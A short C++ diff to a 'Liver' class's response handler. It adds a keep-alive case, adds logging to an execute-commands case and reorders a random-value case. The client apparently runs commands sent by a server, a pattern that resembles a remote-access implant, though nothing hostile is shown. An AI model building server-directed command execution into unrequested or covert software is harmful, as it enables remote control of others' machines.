@@ -78,19 +78,26 @@ void Liver::handle_response(IResponse::Ptr response)
 {
 	switch (response->type())
 	{
-	case IResponse::Type::SEND_RANDOM:
+	case IResponse::Type::KEEP_ALIVE:
 	{
-		const auto send_random_response = std::dynamic_pointer_cast<SendRandomResponse>(std::move(response));
-		TRACE(L"SendRandomResponse random: ", send_random_response->value());
+		TRACE(L"got KeepAlive request");
 		break;
 	}
 
 	case IResponse::Type::EXECUTE_COMMANDS:
 	{
+		TRACE(L"got ExecuteCommands request");
 		const auto execute_commands_response = std::dynamic_pointer_cast<ExecuteCommandsResponse>(
 			std::move(response)
 		);
 		handle_execute_commands(*execute_commands_response);
+		break;
+	}
+
+	case IResponse::Type::SEND_RANDOM:
+	{
+		const auto send_random_response = std::dynamic_pointer_cast<SendRandomResponse>(std::move(response));
+		TRACE(L"SendRandomResponse random: ", send_random_response->value());
 		break;
 	}
 
